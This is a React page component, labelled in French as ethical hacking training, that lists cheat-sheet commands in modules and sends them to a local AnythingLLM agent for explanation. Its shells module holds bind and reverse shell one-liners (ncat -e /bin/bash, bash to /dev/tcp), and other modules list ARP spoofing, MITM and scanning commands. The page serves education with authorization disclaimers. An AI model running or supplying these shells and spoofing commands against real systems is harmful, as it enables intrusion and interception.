import React, { useState, useEffect } from 'react';

const CyberTrainingPage = () => {
  const [selectedModule, setSelectedModule] = useState('recon');
  const [terminalOutput, setTerminalOutput] = useState('> Agent prêt pour entraînement...\n');
  const [isTraining, setIsTraining] = useState(false);
  const [agentResponse, setAgentResponse] = useState('');
  
  // Aikido Security State
  const [aikidoData, setAikidoData] = useState(null);
  const [aikidoLoading, setAikidoLoading] = useState(false);
  const [aikidoError, setAikidoError] = useState(null);

  // Charger les données Aikido quand le module est sélectionné
  useEffect(() => {
    if (selectedModule === 'aikido') {
      loadAikidoData();
    }
  }, [selectedModule]);

  const loadAikidoData = async () => {
    setAikidoLoading(true);
    setAikidoError(null);
    try {
      const response = await fetch('http://localhost:3000/api/cyber-training/aikido/summary');
      const data = await response.json();
      if (data.error) {
        setAikidoError(data.error);
      } else {
        setAikidoData(data);
      }
    } catch (error) {
      setAikidoError('Impossible de se connecter à Aikido. Vérifiez vos credentials.');
    }
    setAikidoLoading(false);
  };

  const modules = {
    recon: {
      title: '🔍 Reconnaissance',
      icon: '🔍',
      color: 'from-blue-500 to-cyan-500',
      description: 'Information Gathering, DNS, WHOIS, Network Discovery',
      commands: [
        { cmd: 'whois compass-security.com', desc: 'Trouver le propriétaire du domaine' },
        { cmd: 'dig example.com ns', desc: 'Enumération DNS nameservers' },
        { cmd: 'dig -x 10.5.23.42', desc: 'Reverse DNS lookup' },
        { cmd: 'nmap -sn -Pn compass-security.com', desc: 'Host discovery sans ping' }
      ]
    },
    network: {
      title: '🌐 Network Scanning',
      icon: '🌐',
      color: 'from-green-500 to-emerald-500',
      description: 'Nmap, Port Scanning, Service Detection',
      commands: [
        { cmd: 'nmap -n -sn -PR 10.5.23.0/24', desc: 'ARP Scan réseau local' },
        { cmd: 'nmap -sL 10.5.23.0/24', desc: 'Reverse DNS lookup range' },
        { cmd: 'nmap -sn -n 10.5.23.0/24', desc: 'Host discovery ARP/ICMP/SYN' },
        { cmd: 'nmap -Pn -n -sS -p 22,25,80,443,8080 10.5.23.0/24', desc: 'TCP SYN scan ports communs' },
        { cmd: 'nmap -n -Pn -p 443 --script "vuln and safe" 10.5.23.0/24', desc: 'Scan vulnérabilités' }
      ]
    },
    http: {
      title: '🌍 HTTP/Web',
      icon: '🌍',
      color: 'from-orange-500 to-red-500',
      description: 'Web Enumeration, Directory Busting, HTTP Analysis',
      commands: [
        { cmd: 'python3 -m http.server 2305', desc: 'Démarrer serveur Python' },
        { cmd: 'curl http://10.5.23.42:2305/?foo=bar', desc: 'Requête HTTP GET' },
        { cmd: 'nikto -host https://example.net', desc: 'Scan vulnérabilités web' },
        { cmd: 'gobuster -u https://10.5.23.42 -w /usr/share/wordlists/dirb/common.txt', desc: 'Directory enumeration' }
      ]
    },
    sniffing: {
      title: '👃 Sniffing',
      icon: '👃',
      color: 'from-purple-500 to-pink-500',
      description: 'Traffic Capture, ARP Spoofing, MITM',
      commands: [
        { cmd: 'tcpdump -i interface', desc: 'Capturer trafic interface' },
        { cmd: 'arpspoof -t 10.5.23.42 10.5.23.1', desc: 'ARP Spoofing' },
        { cmd: 'ettercap -G', desc: 'MITM graphique' },
        { cmd: 'wireshark -k -i -', desc: 'Sniffing SSH over remote' },
        { cmd: 'driftnet', desc: 'Capture images trafic' }
      ]
    },
    shells: {
      title: '💀 Shells & Pivoting',
      icon: '💀',
      color: 'from-red-600 to-rose-700',
      description: 'Bind Shell, Reverse Shell, Persistence',
      commands: [
        { cmd: 'ncat -l -p 2305 -e "/bin/bash -i"', desc: 'Bind shell sur victime' },
        { cmd: 'ncat 10.5.23.42 2305', desc: 'Connecter au bind shell' },
        { cmd: 'ncat -l -p 23', desc: 'Listener reverse shell' },
        { cmd: 'ncat -e "/bin/bash -i" 10.5.23.5 23', desc: 'Reverse shell sortant' },
        { cmd: 'bash -i >&/dev/tcp/10.5.23.5/42 0>&1', desc: 'Reverse shell bash only' },
        { cmd: 'python -c \'import pty; pty.spawn("/bin/bash")\'', desc: 'Upgrade to PTY' }
      ]
    },
    tls: {
      title: '🔐 TLS/Crypto',
      icon: '🔐',
      color: 'from-yellow-500 to-amber-500',
      description: 'SSL/TLS Testing, Certificates, Encryption',
      commands: [
        { cmd: 'openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -nodes', desc: 'Créer certificat auto-signé' },
        { cmd: 'ncat --ssl -l -p 1337 --ssl-cert cert.pem --ssl-key key.pem', desc: 'Démarrer TLS server' },
        { cmd: 'openssl s_client -connect 10.5.23.42:1337', desc: 'Connecter TLS client' },
        { cmd: 'sslyze --regular 10.5.23.42:443', desc: 'Test configuration TLS' },
        { cmd: 'sslscan compass-security.com', desc: 'Scan SSL/TLS' }
      ]
    },
    defense: {
      title: '🛡️ Défense',
      icon: '🛡️',
      color: 'from-teal-500 to-cyan-600',
      description: 'Hardening, Detection, Blue Team Tactics',
      commands: [
        { cmd: 'iptables -A INPUT -p tcp --dport 22 -j DROP', desc: 'Bloquer SSH entrant' },
        { cmd: 'fail2ban-client status', desc: 'Vérifier bans actifs' },
        { cmd: 'netstat -tulpn', desc: 'Lister ports ouverts' },
        { cmd: 'ss -tulpn', desc: 'Sockets actifs' },
        { cmd: 'last -a', desc: 'Dernières connexions' },
        { cmd: 'grep "Failed password" /var/log/auth.log', desc: 'Tentatives brute-force' }
      ]
    },
    aikido: {
      title: '🛡️ Aikido Security',
      icon: '🔒',
      color: 'from-indigo-500 to-purple-600',
      description: 'Scan automatique de vulnérabilités (SAST, SCA, Secrets)',
      type: 'scanner'
    }
  };

  const trainAgent = async (module) => {
    setIsTraining(true);
    setTerminalOutput(prev => prev + `\n> Entraînement module: ${modules[module].title}...\n`);

    try {
      const response = await fetch('http://localhost:3000/api/cyber-training/train', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          module: module,
          commands: modules[module].commands,
          workspace: 'team-cybersecurite'
        })
      });

      const data = await response.json();
      setAgentResponse(data.response || 'Agent entraîné avec succès!');
      setTerminalOutput(prev => prev + `\n✅ Module ${module} complété\n> ${data.response?.substring(0, 200)}...\n`);

    } catch (error) {
      setTerminalOutput(prev => prev + `\n❌ Erreur: ${error.message}\n`);
    }

    setIsTraining(false);
  };

  const executeCommand = async (cmd) => {
    setTerminalOutput(prev => prev + `\n$ ${cmd}\n`);
    
    try {
      const response = await fetch('http://localhost:3000/api/cyber-training/explain', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: cmd, workspace: 'team-cybersecurite' })
      });

      const data = await response.json();
      setTerminalOutput(prev => prev + `\n${data.explanation || 'Explication non disponible'}\n`);
      setAgentResponse(data.explanation);

    } catch (error) {
      setTerminalOutput(prev => prev + `\n[!] Mode offline: ${cmd}\n`);
    }
  };

  return (
    <div className="w-full h-full overflow-y-auto bg-gradient-to-br from-gray-900 via-black to-gray-900 text-white p-6">
      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <div className="text-center mb-8">
          <div className="inline-block px-4 py-2 mb-4 rounded-full bg-red-500/20 border border-red-500/30 backdrop-blur-sm">
            <span className="text-red-400 text-sm font-mono tracking-wider">🔒 ETHICAL HACKING TRAINING</span>
          </div>
          <h1 className="text-4xl md:text-5xl font-bold mb-4 bg-gradient-to-r from-red-500 via-orange-500 to-yellow-500 bg-clip-text text-transparent">
            Cyber Agent Training Center
          </h1>
          <p className="text-gray-400 text-lg">
            Entraînez vos agents AnythingLLM à la cybersécurité défensive via l'offensive
          </p>
          <p className="text-xs text-gray-600 mt-2">
            ⚠️ À des fins éducatives uniquement. N'utilisez que sur des systèmes autorisés.
          </p>
        </div>

        <div className="grid lg:grid-cols-3 gap-6">
          {/* Modules Grid */}
          <div className="lg:col-span-1 space-y-4">
            <h3 className="text-xl font-bold text-white mb-4 flex items-center gap-2">
              <span className="text-2xl">📚</span> Modules d'Entraînement
            </h3>
            {Object.entries(modules).map(([key, mod]) => (
              <button
                key={key}
                onClick={() => setSelectedModule(key)}
                className={`w-full p-4 rounded-xl border transition-all duration-300 text-left ${
                  selectedModule === key 
                    ? `bg-gradient-to-r ${mod.color} border-white/30 shadow-lg shadow-${mod.color.split('-')[1]}-500/30` 
                    : 'bg-gray-800/50 border-gray-700 hover:border-gray-500'
                }`}
              >
                <div className="flex items-center gap-3">
                  <span className="text-2xl">{mod.icon}</span>
                  <div>
                    <div className="font-bold text-white">{mod.title}</div>
                    <div className="text-xs text-gray-300 opacity-80">{mod.description}</div>
                  </div>
                </div>
              </button>
            ))}
          </div>

          {/* Commands Panel OR Aikido Dashboard */}
          <div className="lg:col-span-1 bg-gray-800/50 border border-gray-700 rounded-xl p-6">
            <h3 className="text-xl font-bold text-white mb-4 flex items-center gap-2">
              <span className="text-2xl">{modules[selectedModule].icon}</span>
              {modules[selectedModule].title}
            </h3>
            
            {/* Aikido Security Dashboard */}
            {selectedModule === 'aikido' ? (
              <div className="space-y-4">
                {aikidoLoading && (
                  <div className="text-center py-8">
                    <div className="animate-spin w-8 h-8 border-2 border-purple-500 border-t-transparent rounded-full mx-auto mb-2"></div>
                    <p className="text-gray-400">Chargement des données Aikido...</p>
                  </div>
                )}
                
                {aikidoError && (
                  <div className="bg-red-900/30 border border-red-500/50 rounded-lg p-4">
                    <p className="text-red-400 text-sm">⚠️ {aikidoError}</p>
                    <p className="text-gray-500 text-xs mt-2">
                      Vérifiez vos credentials dans .env (AIKIDO_CLIENT_ID et AIKIDO_CLIENT_SECRET)
                    </p>
                    <button 
                      onClick={loadAikidoData}
                      className="mt-3 px-4 py-2 bg-red-500/20 hover:bg-red-500/30 text-red-400 rounded-lg text-sm"
                    >
                      🔄 Réessayer
                    </button>
                  </div>
                )}
                
                {aikidoData && !aikidoLoading && (
                  <>
                    {/* Workspace Info */}
                    <div className="bg-gray-900/50 rounded-lg p-4 border border-purple-500/30">
                      <p className="text-purple-400 text-sm mb-1">Workspace</p>
                      <p className="text-white font-bold">{aikidoData.workspace}</p>
                      <p className="text-gray-500 text-xs mt-1">{aikidoData.repoCount} repos scannés</p>
                    </div>
                    
                    {/* Security Stats */}
                    <div className="grid grid-cols-2 gap-3">
                      <div className="bg-red-900/30 rounded-lg p-3 border border-red-500/30 text-center">
                        <p className="text-3xl font-bold text-red-400">{aikidoData.stats.critical}</p>
                        <p className="text-xs text-gray-400">Critical</p>
                      </div>
                      <div className="bg-orange-900/30 rounded-lg p-3 border border-orange-500/30 text-center">
                        <p className="text-3xl font-bold text-orange-400">{aikidoData.stats.high}</p>
                        <p className="text-xs text-gray-400">High</p>
                      </div>
                      <div className="bg-yellow-900/30 rounded-lg p-3 border border-yellow-500/30 text-center">
                        <p className="text-3xl font-bold text-yellow-400">{aikidoData.stats.medium}</p>
                        <p className="text-xs text-gray-400">Medium</p>
                      </div>
                      <div className="bg-blue-900/30 rounded-lg p-3 border border-blue-500/30 text-center">
                        <p className="text-3xl font-bold text-blue-400">{aikidoData.stats.low}</p>
                        <p className="text-xs text-gray-400">Low</p>
                      </div>
                    </div>
                    
                    {/* Total */}
                    <div className="bg-gradient-to-r from-indigo-900/50 to-purple-900/50 rounded-lg p-4 border border-purple-500/30 text-center">
                      <p className="text-4xl font-bold text-white">{aikidoData.stats.total}</p>
                      <p className="text-purple-400">Issues de sécurité détectés</p>
                    </div>
                    
                    {/* Recent Issues */}
                    {aikidoData.recentIssues?.length > 0 && (
                      <div className="space-y-2">
                        <p className="text-gray-400 text-sm">Issues récents:</p>
                        {aikidoData.recentIssues.slice(0, 3).map((issue, i) => (
                          <div key={i} className="bg-gray-900/50 rounded-lg p-2 border border-gray-700 text-xs">
                            <p className="text-white truncate">{issue.title || issue.name || 'Issue'}</p>
                            <p className="text-gray-500">{issue.severity}</p>
                          </div>
                        ))}
                      </div>
                    )}
                  </>
                )}
                
                <button
                  onClick={loadAikidoData}
                  disabled={aikidoLoading}
                  className="w-full mt-4 py-3 rounded-lg font-bold text-white bg-gradient-to-r from-indigo-500 to-purple-600 hover:shadow-lg hover:scale-105 transition-all disabled:opacity-50"
                >
                  {aikidoLoading ? '⏳ Chargement...' : '🔄 Actualiser les données'}
                </button>
                
                <a 
                  href="https://app.aikido.dev" 
                  target="_blank" 
                  rel="noopener noreferrer"
                  className="block w-full text-center py-2 text-purple-400 hover:text-purple-300 text-sm"
                >
                  📊 Ouvrir Aikido Dashboard →
                </a>
              </div>
            ) : (
              /* Standard Commands Panel */
              <>
                <div className="space-y-3 max-h-96 overflow-y-auto">
                  {modules[selectedModule].commands?.map((cmd, i) => (
                    <div 
                      key={i}
                      className="bg-gray-900/80 border border-gray-700 rounded-lg p-3 hover:border-cyan-500/50 transition-all cursor-pointer group"
                      onClick={() => executeCommand(cmd.cmd)}
                    >
                      <code className="text-cyan-400 text-sm font-mono block mb-1 group-hover:text-cyan-300">
                        $ {cmd.cmd}
                      </code>
                      <p className="text-gray-500 text-xs">{cmd.desc}</p>
                    </div>
                  ))}
                </div>

                <button
                  onClick={() => trainAgent(selectedModule)}
                  disabled={isTraining}
                  className={`w-full mt-6 py-3 rounded-lg font-bold text-white transition-all ${
                    isTraining 
                      ? 'bg-gray-600 cursor-not-allowed' 
                      : `bg-gradient-to-r ${modules[selectedModule].color} hover:shadow-lg hover:scale-105`
                  }`}
                >
                  {isTraining ? '⏳ Entraînement en cours...' : `🎯 Entraîner l'Agent sur ${modules[selectedModule].title}`}
                </button>
              </>
            )}
          </div>

          {/* Terminal Output */}
          <div className="lg:col-span-1 bg-black border border-green-500/30 rounded-xl p-4 font-mono text-sm">
            <div className="flex items-center gap-2 mb-3 pb-2 border-b border-green-500/20">
              <div className="w-3 h-3 rounded-full bg-red-500"></div>
              <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
              <div className="w-3 h-3 rounded-full bg-green-500"></div>
              <span className="text-green-400 ml-2">agent@cybersec:~</span>
            </div>
            <div className="h-96 overflow-y-auto text-green-400 whitespace-pre-wrap">
              {terminalOutput}
              {isTraining && <span className="animate-pulse">█</span>}
            </div>
          </div>
        </div>

        {/* Agent Response */}
        {agentResponse && (
          <div className="mt-6 bg-gradient-to-r from-purple-900/30 to-blue-900/30 border border-purple-500/30 rounded-xl p-6">
            <h3 className="text-lg font-bold text-purple-400 mb-3 flex items-center gap-2">
              <span>🤖</span> Réponse de l'Agent
            </h3>
            <div className="text-gray-300 whitespace-pre-wrap">{agentResponse}</div>
          </div>
        )}

        {/* Quick Reference */}
        <div className="mt-8 bg-gray-800/30 border border-gray-700 rounded-xl p-6">
          <h3 className="text-xl font-bold text-white mb-4">📋 Référence Rapide - Compass Security Cheat Sheet</h3>
          <div className="grid md:grid-cols-4 gap-4 text-sm">
            <div className="bg-blue-900/30 border border-blue-500/30 rounded-lg p-4">
              <h4 className="font-bold text-blue-400 mb-2">🔍 OSINT</h4>
              <ul className="text-gray-400 space-y-1">
                <li>• shodan.io</li>
                <li>• censys.io</li>
                <li>• crt.sh</li>
                <li>• whois</li>
              </ul>
            </div>
            <div className="bg-green-900/30 border border-green-500/30 rounded-lg p-4">
              <h4 className="font-bold text-green-400 mb-2">🌐 Network</h4>
              <ul className="text-gray-400 space-y-1">
                <li>• nmap</li>
                <li>• masscan</li>
                <li>• netcat</li>
                <li>• socat</li>
              </ul>
            </div>
            <div className="bg-orange-900/30 border border-orange-500/30 rounded-lg p-4">
              <h4 className="font-bold text-orange-400 mb-2">🌍 Web</h4>
              <ul className="text-gray-400 space-y-1">
                <li>• gobuster</li>
                <li>• nikto</li>
                <li>• curl</li>
                <li>• burpsuite</li>
              </ul>
            </div>
            <div className="bg-red-900/30 border border-red-500/30 rounded-lg p-4">
              <h4 className="font-bold text-red-400 mb-2">💀 Exploit</h4>
              <ul className="text-gray-400 space-y-1">
                <li>• metasploit</li>
                <li>• searchsploit</li>
                <li>• EternalBlue</li>
                <li>• reverse shells</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Disclaimer */}
        <div className="mt-6 text-center text-xs text-gray-600">
          <p>⚠️ Utilisation à des fins éducatives uniquement.</p>
          <p>Toujours obtenir l'autorisation écrite avant de tester des systèmes.</p>
          <p>Basé sur Compass Security Hacking Tools Cheat Sheet v1.0</p>
        </div>
      </div>
    </div>
  );
};

export default CyberTrainingPage;
